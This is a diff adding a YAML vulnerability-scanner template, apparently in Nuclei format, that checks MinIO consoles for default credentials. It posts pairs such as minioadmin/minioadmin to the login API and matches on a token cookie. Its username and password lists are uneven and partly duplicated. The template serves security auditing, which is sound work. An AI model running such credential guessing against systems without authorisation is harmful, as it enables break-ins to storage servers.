@@ -1,0 +1,51 @@
+id: yaml-poc-minio-minio-weak_password-CT-158034
+info:
+  name: "Minio 默认弱口令检测"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Minio
+  description: |
+    Detects weak passwords in Minio API by attempting login with known default credentials.
+http:
+  - name: weak-password-test
+    method: POST
+    path:
+      - '{{BaseURL}}/api/v1/login'
+    headers:
+      Content-Type: application/json
+    body: '{"accessKey":"{{username}}","secretKey":"{{password}}"}'
+    payloads:
+      username:
+        - minioadmin
+        - admin
+        - minio
+        - admin
+        - user
+        - admin
+        - minio
+        - minio
+        - minio
+      password:
+        - minioadmin
+        - 12345678
+        - miniostorage
+        - password
+        - password
+        - admin123
+        - miniominio
+        - minio123
+    attack: pitchfork
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - 'Set-Cookie: token='
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "invalid Login"
